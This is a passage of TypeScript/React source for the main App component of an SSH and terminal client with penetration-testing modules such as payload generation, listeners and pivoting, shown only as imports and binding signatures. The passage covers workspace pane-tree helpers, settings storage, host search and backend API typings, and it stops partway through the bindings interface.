import React, { useCallback, useEffect, useMemo, useRef, useState } from 'react';
import {
  AppGlobalSettings,
  DEFAULT_SETTINGS,
  TerminalView,
  applySettingsToAllTerminals,
  changeTerminalFontSize,
  clearTerminalSearch,
  disposeTerminal,
  getSessionCwd,
  getTerminalDimensions,
  resetTerminalFontSize,
  searchTerminalNext,
  searchTerminalPrevious,
  setSessionCwd,
} from './components/TerminalView';
import { TerminalBackground } from './components/TerminalBackground';
import { ExecContextControl } from './components/ExecContextControl';
import { RemoteDirPickerModal } from './components/RemoteDirPickerModal';
import type {
  AttachableSshSession,
  RemoteAgentInfo,
  RemoteDirListing,
  RemoteExecutionContext,
} from './types/remoteAgent';
import { SignalAnalyzerView } from './components/SignalAnalyzerView';
import { SftpBrowserView } from './components/SftpBrowserView';
import { PortForwardingView } from './components/PortForwardingView';
import { SettingsView, SettingsTabId } from './components/SettingsView';
import { ProxyProfilesView } from './components/ProxyProfilesView';
import { ProxychainsExportModal } from './components/ProxychainsExportModal';
import { FileItem, TransferTask } from './types/sftp';
import { ForwardRule, ForwardTunnelStatus } from './types/forward';
import { ProxyProfile, ProxyProfileSummary, ProxychainsExportOptions } from './types/proxy';
import { Snippet, SnippetContext, SnippetChain, SnippetVariable, SnippetChainsFileConfig, SnippetsFileConfig } from './types/snippet';
import { SnippetsManagerModal } from './components/SnippetsManagerModal';
import { SnippetRunModal } from './components/SnippetRunModal';
import { SnippetChainsModal } from './components/SnippetChainsModal';
import { SnippetChainRunnerModal } from './components/SnippetChainRunnerModal';
import { TotpSummary, TotpRecord, TotpCodeResponse } from './types/totp';
import { TotpManagerModal } from './components/TotpManagerModal';
import { TotpQuickSelectorModal } from './components/TotpQuickSelectorModal';
import { NotePage, NotePageSummary, NoteSearchResult } from './types/note';
import { NotesView } from './components/NotesView';
import { HostNotesDrawer } from './components/HostNotesDrawer';
import { SessionLogRecord, SessionLogStatus } from './types/sessionLog';
import { SessionLogsModal } from './components/SessionLogsModal';
import { BroadcastScope, BroadcastState } from './types/broadcast';
import { WorkspaceState, ReconnectState, PersistedTabItem, PersistedWorkspaceNode } from './types/workspace';
import { CyberIcon } from './components/CyberIcon';
import { NetworkMapView } from './components/NetworkMapView';
import { ApiTesterView } from './components/ApiTesterView';
import { HexRunnerView } from './components/HexRunnerView';
import { RemoteSocketsModal } from './components/RemoteSocketsModal';
import type { ApiRequestItem } from './types/apitester';
import { RemoteEditorView } from './components/RemoteEditorView';
import { RemoteEditSession, RemoteConflictInfo } from './types/remoteEdit';
import { VaultSyncInfo, VaultConflictReport } from './types/vaultSync';
import { VaultConflictModal } from './components/VaultConflictModal';
import { ImportModal } from './components/ImportModal';
import { RawTcpConfig, RawTcpListenerConfig, RawTcpListenerInfo, RawTcpSessionStats, RawTcpIncomingEvent } from './types/rawTcp';
import { RawTcpModal } from './components/RawTcpModal';
import { CredentialStoreModal } from './components/CredentialStoreModal';
import { EvidenceVaultModal } from './components/EvidenceVaultModal';
import { EngagementHubModal } from './components/EngagementHubModal';
import { NewEngagementModal } from './components/NewEngagementModal';
import { Engagement, CredentialEntry, EvidenceItem, FindingItem } from './types/pentest';
import { TerminalContextMenu } from './components/TerminalContextMenu';
import {
  SaveSelectionCredModal,
  SaveSelectionEvidenceModal,
  SaveSelectionNoteModal,
  SaveSelectionFindingModal,
} from './components/SaveSelectionModals';
import { ShellStabilizeModal, ShellStabilizeRequest } from './components/ShellStabilizeModal';
import { NmapImportModal } from './components/NmapImportModal';
import { NmapScanResult, NmapImportRequest, NmapImportSummary } from './types/nmap';
import { PayloadGeneratorModal } from './components/PayloadGeneratorModal';
import {
  PayloadTemplate,
  PayloadRenderOptions,
  PayloadRenderResult,
  PayloadFileConfig,
  PayloadEncoding,
} from './types/payload';
import { ListenerManagerModal } from './components/ListenerManagerModal';
import { ListenerProfile, ManagedListenerInfo } from './types/listener';
import { FileTransferModal } from './components/FileTransferModal';
import {
  FileServerKind,
  FileTransferServerConfig,
  FileTransferServerInfo,
  HostedFileEntry,
  NetworkInterfaceIP,
  FileTransferCommandOptions,
  FileTransferCommandSet,
} from './types/fileTransfer';
import { PivotManagerModal } from './components/PivotManagerModal';
import {
  NetworkRoute,
  PivotBinaryStatus,
  PivotCommandSet,
  PivotInstanceInfo,
  PivotTool,
  TwoStepSshPivotRequest,
} from './types/pivot';
import { RouteHealthModal, type DashboardListenerSnapshot } from './components/RouteHealthModal';
import type { RouteCheckRequest, RouteHealthReport, SocksCandidateOption } from './types/routeHealth';
import { WinrmManagerModal } from './components/WinrmManagerModal';
import type {
  WinrmConnectRequest,
  WinrmExecResult,
  WinrmProfilePayload,
  WinrmProfileSummary,
  WinrmSessionInfo,
  WinrmToolStatus,
  WinrmTransferResult,
} from './types/winrm';
import {
  CustomShortcutItem,
  SYSTEM_SHORTCUTS,
  ShortcutActionId,
  matchesShortcut,
} from './types/shortcuts';
import appLogo from './assets/DoubleAgent_App_Logo.png';
import brandLogoText from './assets/DoubleAgent_Logo_complete_with_text.png';

const SETTINGS_STORAGE_KEY = 'doubleagent_global_settings_v1';

function loadSettingsFromStorage(): AppGlobalSettings {
  try {
    const raw = typeof window !== 'undefined' && window.localStorage ? window.localStorage.getItem(SETTINGS_STORAGE_KEY) : null;
    if (raw) {
      const parsed = JSON.parse(raw);
      return { ...DEFAULT_SETTINGS, ...parsed };
    }
  } catch {
    // ignore local storage errors
  }
  return DEFAULT_SETTINGS;
}

function hasExplicitLowLatencySetting(): boolean {
  try {
    const raw =
      typeof window !== 'undefined' && window.localStorage
        ? window.localStorage.getItem(SETTINGS_STORAGE_KEY)
        : null;
    if (!raw) return false;
    const parsed = JSON.parse(raw) as Record<string, unknown>;
    return Object.prototype.hasOwnProperty.call(parsed, 'lowLatencyMode');
  } catch {
    return false;
  }
}

function saveSettingsToStorage(settings: AppGlobalSettings): void {
  try {
    if (typeof window !== 'undefined' && window.localStorage) {
      window.localStorage.setItem(SETTINGS_STORAGE_KEY, JSON.stringify(settings));
    }
  } catch {
    // ignore
  }
}

export interface HostKeyPromptInfo {
  hostPattern: string;
  port: number;
  keyType: string;
  fingerprint: string;
}

interface AppStatusPayload {
  name: string;
  version: string;
  milestone: string;
  vaultLocked: boolean;
  vaultInitialized: boolean;
  passwordless: boolean;
  quickUnlockReady: boolean;
}

interface GroupDefaults {
  port?: number;
  username?: string;
  identityId?: string;
  initialDir?: string;
  keepaliveSecs?: number;
  proxyProfileId?: string;
  sessionLogging?: boolean;
}

interface GroupRecord {
  id: string;
  name: string;
  parentId?: string;
  defaultSettings: GroupDefaults;
}

interface HostSummary {
  id: string;
  label: string;
  address: string;
  effectivePort: number;
  effectiveUser: string;
  initialDir?: string;
  keepaliveSecs: number;
  groupId: string;
  identityId: string;
  tags: string[];
  color: string;
  favorite: boolean;
  proxyProfileId?: string;
  proxyCommand?: string;
  jumpChain?: string[];
  sessionLogging?: boolean;
  engagementId?: string;
}

interface IdentitySummary {
  id: string;
  label: string;
  username: string;
  authMethod: string;
  keyId?: string;
  totpId?: string;
}

interface SshKeySummary {
  id: string;
  label: string;
  type: string;
  publicKey: string;
  fingerprint: string;
}

interface SSHConfigHostEntry {
  hostAlias: string;
  hostName: string;
  user: string;
  port: number;
  identityFile: string;
  proxyJump: string[];
}

interface SSHConfigParseResult {
  entries: SSHConfigHostEntry[];
  warnings: string[];
}

interface VaultSummary {
  groups: GroupRecord[];
  hosts: HostSummary[];
  identities: IdentitySummary[];
  keys?: SshKeySummary[];
  proxyProfiles?: ProxyProfileSummary[];
  snippets?: Snippet[];
  snippetChains?: SnippetChain[];
  totpRecords?: TotpSummary[];
  notes?: NotePageSummary[];
}

interface QuickConnectTarget {
  user: string;
  address: string;
  port: number;
  display: string;
}

interface HostSearchResult {
  host: HostSummary;
  score: number;
  matchedFields: string[];
}

interface CommandPaletteResponse {
  query: string;
  hostResults: HostSearchResult[];
  quickConnect?: QuickConnectTarget;
}

export type SplitDirection = 'none' | 'horizontal' | 'vertical';

export type DockablePaneType =
  | 'terminal'
  | 'notes'
  | 'totp'
  | 'sftp'
  | 'snippets'
  | 'launcher'
  | 'network-map'
  | 'editor';

export type DropZonePosition = 'left' | 'right' | 'top' | 'bottom' | 'center';

export type WorkspaceDragPayload =
  | { type: 'pane'; tabId: string; paneId: string; title: string }
  | { type: 'tab'; tabId: string; title: string }
  | { type: 'host'; hostId: string; label: string }
  | {
    type: 'tool';
    toolType:
    | 'notes'
    | 'totp'
    | 'sftp'
    | 'snippets'
    | 'local-powershell'
    | 'local-cmd'
    | 'local-bash'
    | 'network-map'
    | 'editor';
    hostId?: string;
    title: string;
  };

export type WorkspaceNode =
  | {
    type: 'pane';
    id: string;
    sessionId: string;
    hostId?: string;
    title: string;
    cwd?: string;
    paneType?: DockablePaneType;
    notesHostId?: string;
    sftpSessionId?: string;
    editSessionId?: string;
    editRemotePath?: string;
    isRawTcp?: boolean;
    rawTcpHost?: string;
    rawTcpPort?: number;
    initialLineMode?: boolean;
    initialLineEnding?: 'crlf' | 'lf' | 'cr';
  }
  | {
    type: 'split';
    id: string;
    direction: 'horizontal' | 'vertical';
    children: WorkspaceNode[];
    ratios?: number[];
  };

export interface PaneItem {
  id: string;
  sessionId: string;
  hostId?: string;
  title: string;
  cwd?: string;
  paneType?: DockablePaneType;
  notesHostId?: string;
  sftpSessionId?: string;
  editSessionId?: string;
  editRemotePath?: string;
  isRawTcp?: boolean;
  rawTcpHost?: string;
  rawTcpPort?: number;
  initialLineMode?: boolean;
  initialLineEnding?: 'crlf' | 'lf' | 'cr';
}

export interface TabItem {
  id: string;
  title: string;
  hostId?: string;
  color?: string;
  rootNode: WorkspaceNode;
  activePaneId: string;
  tabType?: 'terminal' | 'sftp' | 'settings' | 'notes' | 'network-map' | 'editor' | 'winrm' | 'route-health' | 'api-tester' | 'hex-runner';
  sftpSessionId?: string;
  notesHostId?: string;
  notesInitialNoteId?: string | null;
  editSessionId?: string;
  editRemotePath?: string;
}

export const HOST_PALETTE = [
  'var(--accent-bright)', // Sky blue
  '#10b981', // Emerald green
  '#f59e0b', // Amber yellow
  '#f43f5e', // Rose red
  '#8b5cf6', // Violet purple
  'var(--accent-bright)', // Cyan
  '#ec4899', // Pink
  'var(--accent-primary)', // Teal
  '#eab308', // Yellow
  '#6366f1', // Indigo
];

export function getEffectiveHostColor(
  hostId?: string,
  explicitColor?: string,
  label?: string
): string {
  if (explicitColor && explicitColor.trim()) {
    return explicitColor.trim();
  }
  const key = hostId || label || 'host-default';
  let hash = 0;
  for (let i = 0; i < key.length; i++) {
    hash = (hash << 5) - hash + key.charCodeAt(i);
    hash |= 0;
  }
  return HOST_PALETTE[Math.abs(hash) % HOST_PALETTE.length];
}

export function collectPanes(node: WorkspaceNode | null): PaneItem[] {
  if (!node) {
    return [];
  }
  if (node.type === 'pane') {
    return [
      {
        id: node.id,
        sessionId: node.sessionId,
        hostId: node.hostId,
        title: node.title,
        cwd: node.cwd,
        paneType: node.paneType,
        notesHostId: node.notesHostId,
        sftpSessionId: node.sftpSessionId,
      },
    ];
  }
  return node.children.flatMap(collectPanes);
}

export function findPane(node: WorkspaceNode | null, paneId: string): PaneItem | null {
  if (!node) {
    return null;
  }
  if (node.type === 'pane') {
    return node.id === paneId ? node : null;
  }
  for (const child of node.children) {
    const found = findPane(child, paneId);
    if (found) {
      return found;
    }
  }
  return null;
}

export function findHostForSessionId(sessionId: string, tabs: TabItem[]): string | undefined {
  for (const t of tabs) {
    const panes = collectPanes(t.rootNode);
    const matched = panes.find((p) => p.sessionId === sessionId);
    if (matched) {
      return matched.hostId || t.hostId;
    }
  }
  return undefined;
}

export function findPaneNode(
  node: WorkspaceNode | null,
  paneId: string
): Extract<WorkspaceNode, { type: 'pane' }> | null {
  if (!node) {
    return null;
  }
  if (node.type === 'pane') {
    return node.id === paneId ? node : null;
  }
  for (const child of node.children) {
    const found = findPaneNode(child, paneId);
    if (found) {
      return found;
    }
  }
  return null;
}

export function splitPaneInTree(
  root: WorkspaceNode,
  targetPaneId: string,
  newPane: WorkspaceNode,
  direction: 'horizontal' | 'vertical'
): WorkspaceNode {
  if (root.type === 'pane') {
    if (root.id === targetPaneId) {
      return {
        type: 'split',
        id: `split-${newPane.id}`,
        direction,
        children: [root, newPane],
        ratios: [50, 50],
      };
    }
    return root;
  }

  const newChildren: WorkspaceNode[] = [];
  for (const child of root.children) {
    if (child.type === 'pane' && child.id === targetPaneId) {
      if (root.direction === direction) {
        newChildren.push(child, newPane);
      } else {
        newChildren.push({
          type: 'split',
          id: `split-${newPane.id}`,
          direction,
          children: [child, newPane],
          ratios: [50, 50],
        });
      }
    } else {
      newChildren.push(splitPaneInTree(child, targetPaneId, newPane, direction));
    }
  }
  const equalRatios = newChildren.map(() => 100 / newChildren.length);
  return { ...root, children: newChildren, ratios: equalRatios };
}

export function dockNodeInTree(
  root: WorkspaceNode,
  targetPaneId: string,
  nodeToInsert: WorkspaceNode,
  zone: Exclude<DropZonePosition, 'center'>
): WorkspaceNode {
  const direction: 'horizontal' | 'vertical' =
    zone === 'left' || zone === 'right' ? 'horizontal' : 'vertical';
  const insertBefore = zone === 'left' || zone === 'top';

  if (root.type === 'pane') {
    if (root.id === targetPaneId) {
      return {
        type: 'split',
        id: `split-${nodeToInsert.id}-${Date.now()}`,
        direction,
        children: insertBefore ? [nodeToInsert, root] : [root, nodeToInsert],
        ratios: [50, 50],
      };
    }
    return root;
  }

  const newChildren: WorkspaceNode[] = [];
  let insertedDirectly = false;
  for (const child of root.children) {
    if (child.type === 'pane' && child.id === targetPaneId && root.direction === direction) {
      if (insertBefore) {
        newChildren.push(nodeToInsert, child);
      } else {
        newChildren.push(child, nodeToInsert);
      }
      insertedDirectly = true;
    } else if (child.type === 'pane' && child.id === targetPaneId) {
      newChildren.push({
        type: 'split',
        id: `split-${nodeToInsert.id}-${Date.now()}`,
        direction,
        children: insertBefore ? [nodeToInsert, child] : [child, nodeToInsert],
        ratios: [50, 50],
      });
    } else {
      newChildren.push(dockNodeInTree(child, targetPaneId, nodeToInsert, zone));
    }
  }

  const equalRatios = newChildren.map(() => 100 / newChildren.length);
  return {
    ...root,
    children: newChildren,
    ratios: insertedDirectly
      ? equalRatios
      : root.ratios && root.ratios.length === newChildren.length
        ? root.ratios
        : equalRatios,
  };
}

export function swapPanesInTree(
  root: WorkspaceNode,
  paneIdA: string,
  paneIdB: string
): WorkspaceNode {
  if (paneIdA === paneIdB) return root;
  const paneA = findPaneNode(root, paneIdA);
  const paneB = findPaneNode(root, paneIdB);
  if (!paneA || !paneB) return root;

  const replaceRec = (node: WorkspaceNode): WorkspaceNode => {
    if (node.type === 'pane') {
      if (node.id === paneIdA) return { ...paneB };
      if (node.id === paneIdB) return { ...paneA };
      return node;
    }
    return {
      ...node,
      children: node.children.map(replaceRec),
    };
  };
  return replaceRec(root);
}

export function removePaneFromTree(
  root: WorkspaceNode,
  targetPaneId: string
): WorkspaceNode | null {
  if (root.type === 'pane') {
    return root.id === targetPaneId ? null : root;
  }
  const remaining: WorkspaceNode[] = [];
  for (const child of root.children) {
    const updated = removePaneFromTree(child, targetPaneId);
    if (updated !== null) {
      remaining.push(updated);
    }
  }
  if (remaining.length === 0) {
    return null;
  }
  if (remaining.length === 1) {
    return remaining[0];
  }
  const equalRatios = remaining.map(() => 100 / remaining.length);
  return { ...root, children: remaining, ratios: equalRatios };
}

export function movePaneInTree(
  root: WorkspaceNode,
  sourcePaneId: string,
  targetPaneId: string,
  zone: DropZonePosition
): WorkspaceNode {
  if (sourcePaneId === targetPaneId) return root;
  if (zone === 'center') {
    return swapPanesInTree(root, sourcePaneId, targetPaneId);
  }
  const sourceNode = findPaneNode(root, sourcePaneId);
  if (!sourceNode) return root;
  const withoutSource = removePaneFromTree(root, sourcePaneId);
  if (!withoutSource) return root;
  return dockNodeInTree(withoutSource, targetPaneId, sourceNode, zone);
}

export function replacePaneInTree(
  root: WorkspaceNode,
  targetPaneId: string,
  replacementPane: Extract<WorkspaceNode, { type: 'pane' }>
): WorkspaceNode {
  if (root.type === 'pane') {
    return root.id === targetPaneId ? replacementPane : root;
  }
  return {
    ...root,
    children: root.children.map((child) => replacePaneInTree(child, targetPaneId, replacementPane)),
  };
}

export function updateSplitRatiosInTree(
  root: WorkspaceNode,
  splitId: string,
  newRatios: number[]
): WorkspaceNode {
  if (root.type === 'pane') return root;
  if (root.id === splitId) {
    return { ...root, ratios: newRatios };
  }
  return {
    ...root,
    children: root.children.map((c) => updateSplitRatiosInTree(c, splitId, newRatios)),
  };
}

export function equalizeAllSplitsInTree(root: WorkspaceNode): WorkspaceNode {
  if (root.type === 'pane') return root;
  const equalRatios = root.children.map(() => 100 / root.children.length);
  return {
    ...root,
    ratios: equalRatios,
    children: root.children.map(equalizeAllSplitsInTree),
  };
}

function reorderTabsLocal(tabs: TabItem[], fromId: string, toId: string): TabItem[] {
  if (fromId === toId) {
    return tabs;
  }
  const fromIdx = tabs.findIndex((t) => t.id === fromId);
  const toIdx = tabs.findIndex((t) => t.id === toId);
  if (fromIdx === -1 || toIdx === -1) {
    return tabs;
  }
  const next = [...tabs];
  const [moved] = next.splice(fromIdx, 1);
  next.splice(toIdx, 0, moved);
  return next;
}

function cycleIndexLocal(current: number, length: number, delta: number): number {
  if (length <= 0) {
    return 0;
  }
  return (((current + delta) % length) + length) % length;
}

function parseQuickConnectLocal(raw: string): QuickConnectTarget | undefined {
  const trimmed = raw.trim();
  if (!trimmed) {
    return undefined;
  }
  const token = trimmed.replace(/^ssh\s+/i, '').trim();
  const hasExplicit = token.includes('@') || token.includes(':');
  if (!hasExplicit || token.includes(' ')) {
    return undefined;
  }
  let user = 'root';
  let hostPort = token;
  const atIdx = token.indexOf('@');
  if (atIdx !== -1) {
    user = token.slice(0, atIdx).trim();
    hostPort = token.slice(atIdx + 1).trim();
    if (!user || !hostPort) {
      return undefined;
    }
  }
  let address = hostPort;
  let port = 22;
  const colonIdx = hostPort.lastIndexOf(':');
  if (colonIdx !== -1) {
    address = hostPort.slice(0, colonIdx).trim();
    const p = Number(hostPort.slice(colonIdx + 1).trim());
    if (!address || !Number.isInteger(p) || p < 1 || p > 65535) {
      return undefined;
    }
    port = p;
  }
  return {
    user,
    address,
    port,
    display: `${user}@${address}:${port}`,
  };
}

function fuzzyScoreLocal(candidate: string, needle: string, weight: number): number {
  if (!candidate || !needle) {
    return 0;
  }
  if (candidate === needle) {
    return weight * 3;
  }
  if (candidate.startsWith(needle)) {
    return weight * 2;
  }
  const subIdx = candidate.indexOf(needle);
  if (subIdx !== -1) {
    return weight + Math.max(0, 20 - subIdx);
  }
  // Subsequence fuzzy match
  if (needle.length < 2 || needle.length > candidate.length) {
    return 0;
  }
  let nIdx = 0;
  for (let i = 0; i < candidate.length && nIdx < needle.length; i++) {
    if (candidate[i] === needle[nIdx]) {
      nIdx++;
    }
  }
  return nIdx === needle.length ? Math.floor(weight / 2) : 0;
}

function searchHostsFuzzyLocal(hosts: HostSummary[], query: string): HostSearchResult[] {
  const q = query.trim().toLowerCase();
  if (!q) {
    return hosts.map((host) => ({ host, score: 1, matchedFields: [] }));
  }
  const tokens = q.split(/\s+/).filter(Boolean);
  const out: HostSearchResult[] = [];
  for (const host of hosts) {
    let total = 0;
    let allMatched = true;
    const matchedFields: string[] = [];
    for (const tok of tokens) {
      let tokScore = 0;
      const nameScore = fuzzyScoreLocal(host.label.toLowerCase(), tok, 120);
      if (nameScore > 0) {
        tokScore += nameScore;
        matchedFields.push('name');
      }
      const addrScore = fuzzyScoreLocal(host.address.toLowerCase(), tok, 100);
      if (addrScore > 0) {
        tokScore += addrScore;
        matchedFields.push('address');
      }
      for (const tag of host.tags) {
        const tagScore = fuzzyScoreLocal(tag.toLowerCase(), tok, 90);
        if (tagScore > 0) {
          tokScore += tagScore;
          matchedFields.push(`tag:${tag}`);
        }
      }
      if (tokScore === 0) {
        allMatched = false;
        break;
      }
      total += tokScore;
    }
    if (allMatched && total > 0) {
      out.push({ host, score: total, matchedFields });
    }
  }
  return out.sort((a, b) => b.score - a.score || a.host.label.localeCompare(b.host.label));
}

interface TerminalDataPayload {
  sessionId: string;
  data: string;
  sessionID?: string;
}

interface WailsAppBindings {
  HealthCheck: () => Promise<AppStatusPayload>;
  IsRemoteDisplayEnvironment?: () => Promise<boolean>;
  GetRemoteExecutionContext?: () => Promise<RemoteExecutionContext>;
  AttachRemoteAgent?: (sessionId: string, label: string) => Promise<RemoteAgentInfo>;
  SetActiveExecutionContext?: (sessionId: string) => Promise<RemoteExecutionContext>;
  DetachRemoteAgent?: (sessionId: string) => Promise<RemoteExecutionContext>;
  OpenRemoteAgentTerminal?: (workingDir: string, size: { cols: number; rows: number }) => Promise<string>;
  ListRemoteAgentDir?: (dirPath: string) => Promise<RemoteDirListing>;
  MakeRemoteAgentDir?: (dirPath: string) => Promise<void>;
  InitializeVault: (masterPassword: string) => Promise<void>;
  InitializeVaultWithHello: () => Promise<void>;
  UnlockVault: (masterPassword: string) => Promise<void>;
  ChangeVaultPassword: (currentPassword: string, newPassword: string) => Promise<void>;
  EnableQuickUnlock: () => Promise<void>;
  UnlockVaultWithHello: () => Promise<void>;
  ResetVault: () => Promise<void>;
  LockVault: () => Promise<void>;
  GetVaultSummary: () => Promise<VaultSummary>;
  SearchCommandPalette?: (query: string) => Promise<CommandPaletteResponse>;
  SaveGroup: (group: GroupRecord) => Promise<void>;
  DeleteGroup: (groupId: string) => Promise<void>;
  SaveIdentity: (identity: {
    id: string;
    label: string;
    username: string;
    authMethod: string;
    password?: string;
    keyId?: string;
  }) => Promise<void>;
  SaveHost: (host: {
    id: string;
    label: string;
    address: string;
    port: number;
    groupId: string;
    identityId: string;
    initialDir?: string;
    tags: string[];
    color?: string;
    favorite: boolean;
    proxyProfileId?: string;
    proxyCommand?: string;
    jumpChain?: string[];
    sessionLogging?: boolean;
    engagementId?: string;
  }) => Promise<void>;
  DeleteHost: (hostId: string) => Promise<void>;
  GetHostPassword?: (hostId: string) => Promise<string>;
  GetIdentityPassword?: (identityId: string) => Promise<string>;
  GenerateSSHKey?: (label: string, keyType: string, passphrase: string) => Promise<SshKeySummary>;
  ImportSSHKey?: (label: string, rawPrivateKey: string, passphrase: string) => Promise<SshKeySummary>;
  DeleteSSHKey?: (keyId: string) => Promise<void>;
  ImportSSHConfig?: (configContent: string) => Promise<SSHConfigParseResult>;
  InjectSessionPassword?: (sessionId: string) => Promise<void>;
  DuplicateSession?: (sessionId: string, size: { cols: number; rows: number }) => Promise<string>;
  OpenTerminalWithOptions?: (
    targetSessionId: string,
    opts: {
      mode: string;
      workingDir: string;
      splitDir: string;
      size: { cols: number; rows: number };
    }
  ) => Promise<string>;
  ConnectSavedHost: (hostId: string, size: { cols: number; rows: number }) => Promise<string>;
  ConnectSSH: (req: {
    address: string;
    port: number;
    username: string;
    password: string;
    keyId?: string;
    privateKey: string;
    passphrase: string;
    useAgent?: boolean;
    size: { cols: number; rows: number };
  }) => Promise<string>;
  ResolveHostKeyPrompt: (host: string, port: number, trust: boolean) => Promise<void>;
  WriteTerminal: (sessionId: string, data: string) => Promise<void>;
  ResizeTerminal: (sessionId: string, cols: number, rows: number) => Promise<void>;
  DisconnectSession: (sessionId: string) => Promise<void>;
  CheckSessionAlive?: (sessionId: string) => Promise<boolean>;
  GetLiveSessionIDs?: () => Promise<string[]>;
  OpenLocalTerminal?: (shellType: string, size: { cols: number; rows: number }) => Promise<string>;
  ListSerialPorts?: () => Promise<SerialPortInfo[]>;
  ConnectSerial?: (cfg: SerialConfig) => Promise<string>;
  SetSerialDTR?: (sessionId: string, state: boolean) => Promise<void>;
  SetSerialRTS?: (sessionId: string, state: boolean) => Promise<void>;
  SendSerialBreak?: (sessionId: string) => Promise<void>;
  AutoDetectSerial?: (port: string) => Promise<SerialAutoDetectResult>;
  ListLocalDir?: (path: string) => Promise<FileItem[]>;
  ListRemoteDir?: (sessionId: string, path: string) => Promise<FileItem[]>;
  StartSftpUpload?: (sessionId: string, localPath: string, remotePath: string) => Promise<string>;
  StartSftpDownload?: (sessionId: string, remotePath: string, localPath: string) => Promise<string>;
  CancelTransfer?: (taskId: string) => Promise<void>;
  CreateRemoteDir?: (sessionId: string, path: string) => Promise<void>;
  DeleteRemoteItem?: (sessionId: string, path: string) => Promise<void>;
  GetActiveTransfers?: () => Promise<TransferTask[]>;
  SaveForwardRule?: (rule: ForwardRule) => Promise<void>;
  DeleteForwardRule?: (ruleId: string) => Promise<void>;
  ListForwardRules?: () => Promise<ForwardRule[]>;
  StartForwardTunnel?: (sessionId: string, ruleId: string) => Promise<string>;
  StopForwardTunnel?: (tunnelId: string) => Promise<void>;
  GetActiveTunnels?: () => Promise<ForwardTunnelStatus[]>;
  SaveProxyProfile?: (profile: ProxyProfile) => Promise<void>;
  DeleteProxyProfile?: (profileId: string) => Promise<void>;
  ListProxyProfiles?: () => Promise<ProxyProfileSummary[]>;
  GetDefaultProxychainsOptions?: () => Promise<ProxychainsExportOptions>;
  GenerateProxychainsConfig?: (opts: ProxychainsExportOptions) => Promise<string>;
  ExportProxychainsConfig?: () => Promise<string>;
  SaveProxychainsFile?: (content: string, targetPath: string) => Promise<void>;
  SaveSnippet?: (snippet: Snippet) => Promise<void>;
  DeleteSnippet?: (snippetId: string) => Promise<void>;
  ListSnippets?: () => Promise<Snippet[]>;
  GetSnippetContext?: (sessionId: string) => Promise<SnippetContext>;
  ResolveSnippetTemplate?: (snippetId: string, sessionId: string, userValues: Record<string, string>) => Promise<string>;
  ExecuteSnippet?: (sessionId: string, snippetId: string, userValues: Record<string, string>) => Promise<void>;
  SaveSnippetChain?: (chain: SnippetChain) => Promise<void>;
  DeleteSnippetChain?: (chainId: string) => Promise<void>;
  ListSnippetChains?: (hostId?: string) => Promise<SnippetChain[]>;
  GetSnippetChainVariables?: (chainId: string) => Promise<SnippetVariable[]>;
  ResolveSnippetChainStep?: (chainId: string, stepIndex: number, sessionId: string, userValues: Record<string, string>) => Promise<string>;
  ExecuteSnippetChainStep?: (sessionId: string, chainId: string, stepIndex: number, userValues: Record<string, string>) => Promise<void>;
  SaveTotpRecord?: (record: TotpRecord) => Promise<void>;
  DeleteTotpRecord?: (totpId: string) => Promise<void>;
  ListTotpRecords?: () => Promise<TotpSummary[]>;
  GetTotpCode?: (totpId: string) => Promise<TotpCodeResponse>;
  GetAllTotpCodes?: () => Promise<TotpCodeResponse[]>;
  ParseOTPAuthURI?: (uri: string) => Promise<TotpRecord>;
  InjectTotpCode?: (sessionId: string, totpId: string) => Promise<void>;
  SaveNote?: (note: NotePage) => Promise<NotePage>;
  DeleteNote?: (noteId: string) => Promise<void>;
  ListNotes?: (hostId: string) => Promise<NotePage[]>;
  GetNote?: (noteId: string) => Promise<NotePage>;
  SearchNotes?: (query: string) => Promise<NoteSearchResult[]>;
  StartSessionLogging?: (sessionId: string) => Promise<SessionLogStatus>;
  StopSessionLogging?: (sessionId: string) => Promise<SessionLogStatus>;
  GetSessionLogStatus?: (sessionId: string) => Promise<SessionLogStatus>;
  ListSessionLogs?: () => Promise<SessionLogRecord[]>;
  ReadSessionLog?: (logId: string) => Promise<string>;
  DeleteSessionLog?: (logId: string) => Promise<void>;
  ExportSessionLog?: (logId: string, targetPath: string) => Promise<void>;
  BroadcastInput?: (sessionIDs: string[], data: string) => Promise<void>;
  SaveWorkspace?: (state: WorkspaceState) => Promise<void>;
  LoadWorkspace?: () => Promise<WorkspaceState>;
  ClearWorkspace?: () => Promise<void>;
  StartRemoteEdit?: (sessionId: string, remotePath: string) => Promise<RemoteEditSession>;
  GetRemoteEditContent?: (editId: string) => Promise<string>;
  SaveRemoteEditContent?: (editId: string, content: string, force: boolean) => Promise<{
    success: boolean;
    conflict: boolean;
    remoteModTime: number;
    remoteSize: number;
    message: string;
  }>;
  CheckRemoteConflict?: (editId: string) => Promise<RemoteConflictInfo>;
  OpenExternalEditor?: (editId: string) => Promise<void>;
  CloseRemoteEdit?: (editId: string) => Promise<void>;
  ListActiveRemoteEdits?: () => Promise<RemoteEditSession[]>;
  GetVaultSyncInfo?: () => Promise<VaultSyncInfo>;
  CheckVaultSyncStatus?: () => Promise<VaultSyncInfo>;
  RelocateVaultFile?: (newPath: string, moveExisting: boolean) => Promise<void>;
  ScanSyncConflictFiles?: () => Promise<string[]>;
  MergeExternalVaultFile?: (filePath: string, password: string) => Promise<VaultConflictReport>;
  ResolveVaultConflicts?: (resolutions: Record<string, string>, deleteExternalFile: boolean) => Promise<void>;
  ConnectRawTcp?: (cfg: RawTcpConfig) => Promise<string>;
  StartRawTcpListener?: (cfg: RawTcpListenerConfig) => Promise<RawTcpListenerInfo>;
  StopRawTcpListener?: (listenerId: string) => Promise<void>;
  ListRawTcpListeners?: () => Promise<RawTcpListenerInfo[]>;
  GetRawTcpSessionStats?: (sessionId: string) => Promise<RawTcpSessionStats>;
  SetRawTcpSessionLineMode?: (sessionId: string, lineMode: boolean, lineEnding: string) => Promise<void>;
  StabilizeShell?: (req: ShellStabilizeRequest) => Promise<void>;
  GetShellStabilizePresets?: () => Promise<unknown[]>;
  ListEngagements?: () => Promise<Engagement[]>;
  GetActiveEngagement?: () => Promise<Engagement | null>;
  SetActiveEngagement?: (id: string) => Promise<void>;
  AssignHostToEngagement?: (hostId: string, engagementId: string) => Promise<void>;
  SaveEngagement?: (e: Engagement) => Promise<void>;
  DeleteEngagement?: (id: string) => Promise<void>;
  ExportEngagementPackage?: (engagementId: string, password: string) => Promise<string>;
  ExportEngagementFile?: (engagementId: string, password: string, targetPath: string) => Promise<void>;
  ImportEngagementPackage?: (packageJson: string, password: string) => Promise<unknown>;
  ImportEngagementFile?: (filePath: string, password: string) => Promise<unknown>;
